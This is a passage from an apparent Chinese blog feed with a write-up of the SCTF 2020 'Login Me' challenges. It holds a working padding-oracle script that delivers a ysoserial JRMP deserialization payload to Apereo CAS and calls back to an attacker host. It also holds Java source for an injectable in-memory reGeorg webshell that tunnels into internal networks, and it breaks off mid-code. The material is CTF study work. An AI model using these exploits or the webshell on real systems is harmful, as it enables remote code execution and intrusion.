<p><a href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/</a></p>
<p><a href="https://blog.csdn.net/qq_48466156/article/details/139691096">https://blog.csdn.net/qq_48466156/article/details/139691096</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit</a></p>
<p><a href="http://www.asuka39.top/article/security/ctf/pwn/2582/">http://www.asuka39.top/article/security/ctf/pwn/2582/</a></p>
]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2020 两道Login Me预期解的核心技术</title>
    <url>/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<!-- more -->
<h2 id="Login-Me-cas-4-x-excution-rce（黑盒）">Login Me - cas 4.x excution rce（黑盒）</h2>
<p>详细的漏洞分析可以参考<a href="https://xz.aliyun.com/t/7032">Apereo CAS 4.X execution参数反序列化漏洞分析</a>这里不在赘述。文章提到了，前后两个版本区间的encode方法是不一样。</p>
<p>在cas4.x-cas.4.1.5中的加密伪代码如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload = gzip(Java Serialized data)</span><br><span class="line">body = aes128_cbc_encode(key, iv, payload))</span><br><span class="line">header = <span class="string">&#x27;\x00\x00\x00\x22\x00\x00\x00\x10&#x27;</span>+iv+<span class="string">&#x27;\x00\x00\x00\x06&#x27;</span>+<span class="string">&#x27;aes128&#x27;</span></span><br><span class="line">excution = uuid + b64encode(header + body)</span><br></pre></td></tr></table></figure>
<p>CAS 4.1.7 ～ 4.2.X的加密伪代码如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))</span><br><span class="line">data = b64encode(cipher)</span><br><span class="line">jwsToken = jws.sign(data, jws_key, algorithm=‘HS512’)</span><br><span class="line">excution = uuid + b64encode(jwsToken)</span><br></pre></td></tr></table></figure>
<p>因为encode的变化excution是不一样的亦可作为判断版本的指纹。</p>
<ul>
<li>cas4.x-cas.4.1.5之前特征：execution base64解码出来以\x00\x00\x00\x22\x00\x00\x00\x10开头。</li>
</ul>
<p><img src="1593850236393-8b8d508a-550c-4e7e-b5ea-9c8c1af56877.png#align=left&amp;display=inline&amp;height=224&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=291&amp;originWidth=970&amp;size=78900&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<ul>
<li>4.1.6之后特征：execution两次base64解码出来不是乱码而是jws格式（header.body.sign）的字符串。</li>
</ul>
<p><img src="1593850262798-64d1e785-98a0-4bce-ab72-936f97704d11.png#align=left&amp;display=inline&amp;height=321&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=423&amp;originWidth=982&amp;size=105001&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
解密题目的execution不难发现，环境是4.x-4.1.5。此外看到，前后两个版本的encode的方式唯一的差异是4.1.6之后execution的需要进行加密签名，联系到它使用的是aes/cbc说到这应该很熟悉了吧padding oracle！</p>
<p>这里padding oracle，仍然需要讲究技巧，直接生成cc链一类的payload进行padding大约需要padding 114组左右数据（题目两小时重启一次，gadget还需要fuzz，这是一个难以完成的任务），但是如果环境能出网的话用jrmp就需要padding 14组数据左右了，这里视环境情况仍然需要跑1h-3h不等，但是通过的分析过<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">cve-2018-2628</a>之后发现jrmp的payload的可以更短只需要7组，我在同区域的阿里云上多线程跑不到20分钟就有了结果（这也是题目描述Time is Flag的暗示233333）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jws</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">start_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line"></span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">header_mode = <span class="string">&#x27;\x00\x00\x00\x22\x00\x00\x00\x10&#123;iv&#125;\x00\x00\x00\x06aes128&#x27;</span></span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line">URL= <span class="string">&quot;http://ip:port/login&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>:<span class="string">&quot;ADF6653ED3808BE63B052BCED53494A3&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64Padding</span>(<span class="params">data</span>):</span><br><span class="line">	missing_padding = <span class="number">4</span> - <span class="built_in">len</span>(data) % <span class="number">4</span></span><br><span class="line">	<span class="keyword">if</span> missing_padding <span class="keyword">and</span> missing_padding != <span class="number">4</span>:</span><br><span class="line">		data += <span class="string">&#x27;=&#x27;</span> * missing_padding</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>):</span><br><span class="line">	gzip_compress = zlib.compressobj(<span class="number">9</span>, zlib.DEFLATED, zlib.MAX_WBITS | <span class="number">16</span>)</span><br><span class="line">	data = gzip_compress.compress(data) + gzip_compress.flush()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitFlippingAttack</span>(<span class="params">fake_value, orgin_value</span>):</span><br><span class="line">	iv = []</span><br><span class="line">	<span class="keyword">for</span> f, o <span class="keyword">in</span> <span class="built_in">zip</span>(fake_value, orgin_value):</span><br><span class="line">		iv.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(f) ^ <span class="built_in">ord</span>(o)))</span><br><span class="line">	<span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_string</span>(<span class="params">payload</span>):</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">	<span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">paramsPost,w</span>):</span><br><span class="line">	response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">return</span> w, response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paddingOracle</span>(<span class="params">value</span>):</span><br><span class="line">	fakeiv = <span class="built_in">list</span>(<span class="built_in">chr</span>(<span class="number">0</span>)*<span class="number">16</span>)</span><br><span class="line">	intermediary_value_reverse = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">		num = <span class="number">16</span></span><br><span class="line">		response_result = []</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>-num+<span class="number">1</span>, num):</span><br><span class="line">			jobs = []</span><br><span class="line">			pool = ThreadPool(num)</span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(j, j + num):</span><br><span class="line">				fakeiv[N-<span class="number">1</span>-i] = <span class="built_in">chr</span>(w)</span><br><span class="line">				<span class="comment">#print(fakeiv)</span></span><br><span class="line">				fake_iv = <span class="string">&#x27;&#x27;</span>.join(fakeiv)</span><br><span class="line">				paramsPost = &#123;<span class="string">&quot;execution&quot;</span>:<span class="string">&quot;4a538b9e-ecfe-4c95-bcc0-448d0d93f494_&quot;</span> + base64.b64encode(header + body + fake_iv + value),<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;submit&quot;</span>:<span class="string">&quot;LOGIN&quot;</span>,<span class="string">&quot;_eventId&quot;</span>:<span class="string">&quot;submit&quot;</span>,<span class="string">&quot;lt&quot;</span>:<span class="string">&quot;LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">				job = pool.apply_async(send_request, (paramsPost,w))</span><br><span class="line">				jobs.append(job)</span><br><span class="line"></span><br><span class="line">			pool.close()</span><br><span class="line">			pool.join()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> jobs:</span><br><span class="line">				j_value, response = w.get()</span><br><span class="line">				<span class="comment">#print(response)</span></span><br><span class="line">				<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">					<span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">5</span> + <span class="string">&quot;200&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">5</span>)</span><br><span class="line">					response_result.append(j_value)</span><br><span class="line">		<span class="built_in">print</span>(response_result)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(response_result) == <span class="number">1</span>:</span><br><span class="line">			j_value  = response_result[<span class="number">0</span>]</span><br><span class="line">			intermediary_value_reverse.append(<span class="built_in">chr</span>((i+<span class="number">1</span>) ^ j_value))</span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					fakeiv[N-w-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(intermediary_value_reverse[w]) ^ (i+<span class="number">2</span>))</span><br><span class="line">				<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">					<span class="built_in">print</span>(fakeiv, intermediary_value_reverse, w, i+<span class="number">1</span>)</span><br><span class="line">					<span class="built_in">print</span>(base64.b64encode(value))</span><br><span class="line">					<span class="built_in">print</span>(e)</span><br><span class="line">					exit()</span><br><span class="line">			<span class="built_in">print</span>(fakeiv)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response_result)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Exit Because count of is &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_result)))</span><br><span class="line">			exit()</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">5</span> + <span class="string">&quot;sleep&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">5</span>)</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	intermediary_value = intermediary_value_reverse[::-<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">return</span> intermediary_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_string</span>(<span class="params">payload</span>):</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">	<span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, <span class="string">&#x27;JRMPClient2&#x27;</span>, <span class="string">&#x27;your_ip:your_port&#x27;</span>],stdout=subprocess.PIPE)</span><br><span class="line">	payload = popen.stdout.read()</span><br><span class="line">	payload = pad_string(compress(payload))</span><br><span class="line"></span><br><span class="line">	excution = <span class="string">&quot;input_excution&quot;</span></span><br><span class="line"></span><br><span class="line">	body = base64.b64decode(excution)[<span class="number">34</span>:]</span><br><span class="line">	header = base64.b64decode(excution)[<span class="number">0</span>:<span class="number">34</span>]</span><br><span class="line">	iv = <span class="built_in">list</span>(header[<span class="number">8</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">	N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">	fake_value_arr = re.findall(<span class="string">r&#x27;[\s\S]&#123;16&#125;&#x27;</span>, payload)</span><br><span class="line">	fake_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">	value = body[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">	payload_value_arr = [value]</span><br><span class="line">	</span><br><span class="line">	count = <span class="number">1</span></span><br><span class="line">	all_count = <span class="built_in">len</span>(fake_value_arr)</span><br><span class="line">	<span class="built_in">print</span>(all_count)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> fake_value_arr:</span><br><span class="line">		intermediary_value = paddingOracle(value)</span><br><span class="line">		<span class="built_in">print</span>(value, intermediary_value)</span><br><span class="line">		fakeIv = bitFlippingAttack(intermediary_value, i)</span><br><span class="line">		value = <span class="string">&#x27;&#x27;</span>.join(fakeIv)</span><br><span class="line">		payload_value_arr.append(value)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">print</span>(count, all_count)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fakeiv = payload_value_arr.pop()</span><br><span class="line">	payload_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">	payload = header_mode.<span class="built_in">format</span>(iv=fakeiv) + <span class="string">&#x27;&#x27;</span>.join(payload_value_arr)</span><br><span class="line">	<span class="built_in">print</span>(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">	end_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">	<span class="built_in">print</span>(start_time,end_time)</span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&#x27;/tmp/cas.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">	f.write(base64.b64encode(payload))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
<p>通过jrmp出来fuzz gadget也很方便，这里用的是JDK7u21（在自己做的时候发现统一端口请求一次jrmp之后，后面的再一次请求会变得很慢，这里可以选择再跑一个端口出来交替使用）。接下来就是常见的读取数据库连接字符串查用户登陆的操作了，在此不细表。</p>
<h2 id="Login-Me-Again-shiro-rce-shiro-bypass-acl（白盒）">Login Me Again - shiro rce &amp;&amp; shiro bypass acl（白盒）</h2>
<p>这道题，由我和@leixiao合作完成，前半部分shiro不出网rce利用由leixiao负责完成，后半部分shiro bvpass acl部分由我负责完成。<br>
先贴一个当时构思这道题时候的速记（有删改）：</p>
<blockquote>
<p>环境：外网一个有shiro rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。</p>
</blockquote>
<blockquote>
<p>攻击思路<br>
1.通过注入有socks5代理功能的webshell代理到内网。<br>
2.找shiro新的权限绕过方法或者谷歌搜到我之前找的shiro ajp越权：<a href="https://issues.apache.org/jira/browse/SHIRO-760">https://issues.apache.org/jira/browse/SHIRO-760</a>，越权上传文件或者用c0ny1师傅的姿势。<br>
3.用ajp漏洞包含刚才上传的图片rce</p>
</blockquote>
<blockquote>
<p>利用难点：1.市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。2.自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。3.市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。</p>
</blockquote>
<p>下面就从利用难点，逐一说明</p>
<h3 id="无文件socks5代理">无文件socks5代理</h3>
<p>因为这里是shiro，shiro本身也是一个filter，所以内存马最好也搞成filter(优先级最高)，内存马的思路可以看基于<a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">Tomcat无文件Webshell研究</a>。至于具体filter的逻辑，改一下reg就好了，下面贴一下leixiao师傅的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemReGeorg</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;CONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-TARGET&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(request.getHeader(<span class="string">&quot;X-PORT&quot;</span>));</span><br><span class="line">                    java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> <span class="title class_">java</span>.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;socket&quot;</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;DISCONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;READ&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buf);</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;FORWARD&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">readlen</span> <span class="operator">=</span> request.getContentLength();</span><br><span class="line">                    <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="built_in">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="built_in">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> <span class="title class_">MemReGeorg</span>(),<span class="string">&quot;reGeorg&quot;</span>,<span class="string">&quot;/*&quot;</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="literal">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="literal">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = 